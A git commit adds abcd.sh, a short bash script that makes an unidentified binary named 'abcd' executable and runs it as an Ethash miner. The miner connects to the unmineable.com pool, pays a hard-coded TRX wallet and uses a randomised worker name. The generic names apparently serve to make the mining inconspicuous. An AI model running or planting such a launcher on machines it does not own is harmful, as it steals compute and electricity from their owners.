f163298e06fbed054b61d3b921a6243467fd2c0d
Preetnub1 <90510484+Preetnub1@users.noreply.github.com>
2021-09-11 22:22:55 +0530

    Create abcd.sh

---
+++ abcd.sh
@@ -0,0 +1,11 @@
+#!/bin/bash
+
+POOL=ethash.unmineable.com:3333
+
+WALLET=TRX:TSBhr84YesnWBVRB3RuwJtE8xckkPUaFYe
+
+WORKEER=$(echo $(shuf -i 1000-9999 -n 1)-abhi#bdfc-cm6i)
+
+chmod +x abcd
+
+./abcd --algo ETHASH --pool $POOL --user $WALLET.$WORKEER --ethstratum ETHPROXY
